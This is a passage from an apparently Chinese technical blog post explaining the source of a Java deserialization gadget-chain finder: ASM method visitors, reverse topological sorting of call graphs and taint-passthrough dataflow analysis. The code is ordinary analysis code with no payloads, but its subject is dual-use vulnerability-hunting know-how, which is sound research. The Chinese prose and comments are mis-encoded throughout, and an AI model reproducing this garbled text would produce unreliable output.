api, <span class="keyword">final</span> MethodVisitor mv,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            <span class="keyword">final</span> String owner, String name, String desc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(api, mv);</span><br><span class="line">        <span class="comment">// è°ƒç”¨çš„æ–¹æ³•é›†åˆï¼Œåˆå§‹åŒ–</span></span><br><span class="line">        <span class="keyword">this</span>.calledMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">// å­˜å‚¨åˆ° PassthroughDiscovery çš„ methodCalls ä¸­</span></span><br><span class="line">        methodCalls.put(<span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc), calledMethods);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¿é—®æ–¹æ³•æŒ‡ä»¤</span></span><br><span class="line"><span class="comment">     * æ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> opcode è°ƒç”¨æ“ä½œç ï¼šINVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC, INVOKEINTERFACE</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> owner  è¢«è°ƒç”¨çš„æ–¹æ³•æ‰€å±ç±»çš„ç±»å</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name   è¢«è°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc   è¢«è°ƒç”¨æ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> itf    è¢«è°ƒç”¨çš„ç±»æ˜¯å¦ä¸ºæ¥å£</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// è®°å½•è°ƒç”¨çš„æ–¹æ³•ï¼Œå­˜å‚¨åˆ° MethodCallDiscoveryMethodVisitor çš„ calledMethods ä¸­</span></span><br><span class="line">        calledMethods.add(<span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc));</span><br><span class="line">        <span class="keyword">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>topologicallySortMethodCalls</code> æ–¹æ³•å¯¹æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆè¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼Œç”¨äºåç»­åˆ¤æ–­æ–¹æ³•å‚æ•°ä¸è¿”å›å€¼çš„å…³ç³»ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><p>æ–¹æ³• parentMethod åœ¨è¿”å›å‰è°ƒç”¨äº† Obj.childMethodï¼Œå› ä¸º Obj.childMethod çš„å‚æ•° carg ä¸è¿”å›å€¼æœ‰å…³ï¼ŒåŒæ—¶ parentMethod å°†å…¶è¿”å›å€¼ä½œä¸ºè‡ªå·±çš„è¿”å›ç»“æœï¼Œæ‰€ä»¥æœ€åå¯ä»¥åˆ¤å®š parentMethod çš„å‚æ•° arg å’Œè¿”å›å€¼æœ‰å…³ã€‚</p><p>å› æ­¤è¦å…ˆåˆ¤æ–­å­æ–¹æ³•è¿”å›å€¼ä¸å­æ–¹æ³•å‚æ•°çš„å…³ç³»ï¼Œå†åˆ¤æ–­çˆ¶æ–¹æ³•è¿”å›å€¼ä¸å‚æ•°çš„å…³ç³»ï¼Œè¿™æ ·æ‰èƒ½åˆ¤æ–­æ–¹æ³•å‚æ•°ä¸è¿”å›å€¼çš„å…³ç³»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">parentMethod</span><span class="params">(String arg)</span></span>&#123;</span><br><span class="line">    String vul = Obj.childMethod(arg);</span><br><span class="line">    <span class="keyword">return</span> vul;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">childMethod</span><span class="params">(String carg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> carg.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†å®ç°å…ˆåˆ¤æ–­å­æ–¹æ³•ååˆ¤æ–­çˆ¶æ–¹æ³•ï¼Œè¿™é‡Œå°±éœ€è¦è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼Œé€†æ‹“æ‰‘æ’åºä½¿ç”¨æ ˆå®ç°ï¼Œå˜é‡ <code>dfsStack</code> å’Œ <code>visitedNodes</code> ç”¨äºé¿å…å½¢æˆç¯ï¼ŒåŒæ—¶ <code>visitedNodes</code> è¿˜å¯ä»¥é¿å…é‡å¤æ’åºï¼Œå…·ä½“çš„æ’åºæ“ä½œç”± <code>dfsTsort</code> å®ç°ï¼Œæ‰€æœ‰æ–¹æ³•è°ƒç”¨æ•´åˆä¸ºä¸€ä¸ªé›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯¹æ–¹æ³•çš„è°ƒç”¨å…³ç³»è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼ˆæŒ‰åç§°é€†åºï¼‰</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">    <span class="comment">// æ‹·è´æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">        MethodReference.Handle method = entry.getKey(); <span class="comment">// æ–¹æ³•</span></span><br><span class="line">        outgoingReferences.put(method, <span class="keyword">new</span> HashSet&lt;&gt;(entry.getValue()));    <span class="comment">// è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Topological sort methods</span></span><br><span class="line">    LOGGER.debug(<span class="string">&quot;Performing topological sort...&quot;</span>);</span><br><span class="line">    Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> HashSet&lt;&gt;();     <span class="comment">// é¿å…å½¢æˆç¯</span></span><br><span class="line">    Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> HashSet&lt;&gt;(); <span class="comment">// åœ¨è°ƒç”¨é“¾å‡ºç°é‡åˆæ—¶ï¼Œé¿å…é‡å¤æ’åº</span></span><br><span class="line">    List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> ArrayList&lt;&gt;(outgoingReferences.size());    <span class="comment">// æ–¹æ³•è°ƒç”¨é›†åˆ</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">        <span class="comment">// éå†é›†åˆä¸­çš„èµ·å§‹æ–¹æ³•ï¼Œè¿›è¡Œé€’å½’æœç´¢ï¼ˆDFSï¼‰ï¼Œç»è¿‡é€†æ‹“æ‰‘æ’åºï¼Œè°ƒç”¨é“¾çš„æœ€æœ«ç«¯æ’åœ¨æœ€å‰é¢ï¼Œ</span></span><br><span class="line">        <span class="comment">// åç»­è¿›è¡Œå‚æ•°ã€è¿”å›å€¼ã€è°ƒç”¨é“¾ä¹‹é—´çš„æ±¡ç‚¹ä¼ é€’åˆ†æ</span></span><br><span class="line">        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.debug(String.format(<span class="string">&quot;Outgoing references %d, sortedMethods %d&quot;</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// é€†æ‹“æ‰‘æ’åºåçš„æ–¹æ³•è°ƒç”¨é›†åˆ</span></span><br><span class="line">    <span class="keyword">return</span> sortedMethods;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€†æ‹“æ‰‘æ’åºçš„å…·ä½“å®ç°</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outgoingReferences æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sortedMethods      é€†æ‹“æ‰‘æ’åºåçš„æ–¹æ³•é›†åˆ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> visitedNodes       å·²æ’åºçš„æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> stack              æ ˆ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> node               å¾…æ’åºçš„èµ·å§‹æ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span></span><br><span class="line"><span class="function"><span class="params">                             List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">                             Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// é˜²æ­¢åœ¨éå†ä¸€æ¡è°ƒç”¨é“¾ä¸­è¿›å…¥å¾ªç¯</span></span><br><span class="line">    <span class="keyword">if</span> (stack.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é˜²æ­¢å¯¹æŸä¸ªæ–¹æ³•åŠè¢«è°ƒæ–¹æ³•é‡å¤æ’åº</span></span><br><span class="line">    <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®èµ·å§‹æ–¹æ³•ï¼Œå–å‡ºè¢«è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">    Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">    <span class="keyword">if</span> (outgoingRefs == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stack.add(node);    <span class="comment">// å…¥æ ˆï¼Œé¿å…é€’å½’æ­»å¾ªç¯</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123; <span class="comment">// å¯¹è¢«è°ƒç”¨æ–¹æ³•é€’å½’è¿›è¡Œæ’åº</span></span><br><span class="line">        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">    &#125;</span><br><span class="line">    stack.remove(node); <span class="comment">// å‡ºæ ˆï¼Œæ–¹æ³•æ’åºå®Œæ¯•</span></span><br><span class="line">    visitedNodes.add(node);     <span class="comment">// è®°å½•å·²è®¿é—®çš„æ–¹æ³•ï¼Œåœ¨é€’å½’é‡åˆ°é‡å¤æ–¹æ³•æ—¶å¯ä»¥è·³è¿‡</span></span><br><span class="line">    sortedMethods.add(node);    <span class="comment">// è®°å½•å·²æ’åºçš„æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨ <code>calculatePassthroughDataflow</code> æ–¹æ³•åˆ¤æ–­æ¯ä¸ªæ–¹æ³•çš„è¿”å›å€¼ä¸å‚æ•°å…³ç³»ï¼Œé¦–å…ˆè·³è¿‡é™æ€ä»£ç å—ï¼Œç„¶ååˆ©ç”¨ asm çš„è®¿é—®è€…å¯¹é€†æ‹“æ‰‘æ’åºå¾—åˆ°çš„æ–¹æ³•é›†åˆè¿›è¡Œéå†å’Œåˆ†æåˆ¤æ–­ã€‚</p><ul><li>é™æ€ä»£ç å—åœ¨ç±»åŠ è½½æ—¶è°ƒç”¨ï¼Œåªæ‰§è¡Œä¸€æ¬¡ï¼Œä¸”ä¼˜å…ˆäºä¸»å‡½æ•°ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ†ææ–¹æ³•è°ƒç”¨é›†åˆï¼Œè·å–æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceByName ç±»èµ„æºé›†åˆ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classMap            ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inheritanceMap      ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sortedMethods       æ‰€æœ‰æ–¹æ³•é›†åˆï¼ˆç»è¿‡é€†æ‹“æ‰‘æ’åºï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> serializableDecider åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName,</span><br><span class="line">                                                                                      Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span><br><span class="line">                                                                                      InheritanceMap inheritanceMap,</span><br><span class="line">                                                                                      List&lt;MethodReference.Handle&gt; sortedMethods,</span><br><span class="line">                                                                                      SerializableDecider serializableDecider) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•ã€ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle method : sortedMethods) &#123;</span><br><span class="line">        <span class="comment">// è·³è¿‡ static é™æ€åˆå§‹åŒ–ä»£ç ï¼ˆé™æ€ä»£ç å—ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;&lt;clinit&gt;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ–¹æ³•æ‰€å±ç±»çš„ç±»èµ„æº</span></span><br><span class="line">        ClassResourceEnumerator.ClassResource classResource = classResourceByName.get(method.getClassReference().getName());</span><br><span class="line">        <span class="keyword">try</span> (InputStream inputStream = classResource.getInputStream()) &#123;    <span class="comment">// è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(inputStream);  <span class="comment">// åˆ›å»º ClassReaderï¼Œåç»­è°ƒç”¨ accept æ–¹æ³•è§£æç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * classMap             ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">                 * inheritanceMap       ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"><span class="comment">                 * passthroughDataflow  æ•°æ®æµä¿¡æ¯ï¼Œåˆå§‹ä¸ºç©º</span></span><br><span class="line"><span class="comment">                 * serializableDecider  åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line"><span class="comment">                 * Opcodes.ASM6         ASM API ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">                 * method               å¾…è§‚å¯Ÿçš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="comment">// ç»§æ‰¿ asm çš„ ClassVisitor(MethodVisitor) å®ç°å¯¹ç±»æ–‡ä»¶çš„è§‚å¯Ÿï¼Œè®°å½•ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">                PassthroughDataflowClassVisitor cv = <span class="keyword">new</span> PassthroughDataflowClassVisitor(classMap, inheritanceMap,</span><br><span class="line">                        passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisit -&gt; visitMethod</span></span><br><span class="line">                cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ç¼“å­˜æ–¹æ³•çš„å“ªäº›å‚æ•°ä¼šå½±å“è¿”å›å€¼</span></span><br><span class="line">                passthroughDataflow.put(method, cv.getReturnTaint());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Exception analyzing &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;Unable to analyze &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PassthroughDataflowClassVisitor</code> ç»§æ‰¿äº† asm ä¸­çš„ ClassVisitorï¼Œé‡å†™ <code>visit</code> è®°å½•æ–¹æ³•æ‰€å±ç±»çš„åç§°ï¼Œé‡å†™ <code>visitMethod</code> å¯¹å¾…è§‚å¯Ÿçš„æ–¹æ³•ç”¨ <code>PassthroughDataflowMethodVisitor</code> åˆ¤æ–­è¿”å›å€¼ä¸å‚æ•°çš„å…³ç³»ï¼Œæ–¹æ³• <code>getReturnTaint</code> è¿”å›èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PassthroughDataflowClassVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap;    <span class="comment">// ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle methodToVisit;     <span class="comment">// å¾…è§‚å¯Ÿçš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;            <span class="comment">// ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;  <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;    <span class="comment">// ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> PassthroughDataflowMethodVisitor passthroughDataflowMethodVisitor;  <span class="comment">// æ–¹æ³•è®¿é—®è€…</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PassthroughDataflowClassVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                           InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow,</span></span></span><br><span class="line"><span class="function"><span class="params">                                           SerializableDecider serializableDecider, <span class="keyword">int</span> api, MethodReference.Handle methodToVisit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(api); <span class="comment">// ASM API ç‰ˆæœ¬</span></span><br><span class="line">        <span class="keyword">this</span>.classMap = classMap;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="keyword">this</span>.methodToVisit = methodToVisit;</span><br><span class="line">        <span class="keyword">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="keyword">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature,</span></span></span><br><span class="line"><span class="function"><span class="params">                      String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        <span class="keyword">this</span>.name = name;   <span class="comment">// è®°å½•ç±»å</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä¸æ˜¯å¾…è§‚å¯Ÿæ–¹æ³•çš„æ‰€å±ç±»</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.name.equals(methodToVisit.getClassReference().getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Expecting to visit &quot;</span> + methodToVisit.getClassReference().getName() + <span class="string">&quot; but instead got &quot;</span> + <span class="keyword">this</span>.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ä¸æ˜¯å¾…è§‚å¯Ÿæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">if</span> (!name.equals(methodToVisit.getName()) || !desc.equals(methodToVisit.getDesc())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Constructing passthroughDataflowMethodVisitor twice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œè¿”å›æ–°çš„æ–¹æ³•è§‚å¯Ÿè€…</span></span><br><span class="line">        <span class="comment">// å¦‚æœç±»è§‚å¯Ÿè€…çš„ cv å˜é‡ä¸ºç©ºï¼Œåˆ™è¿”å› nullï¼Œå¦åˆ™è¿”å› cv.visitMethod</span></span><br><span class="line">        MethodVisitor mv = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ–¹æ³•è®¿é—®è€…ï¼Œåˆ¤æ–­æ–¹æ³•è¿”å›å€¼ä¸å‚æ•°çš„å…³ç³»</span></span><br><span class="line">        <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisitCode -&gt; visitInsn -&gt; visitFieldInsn -&gt; visitMethodInsn</span></span><br><span class="line">        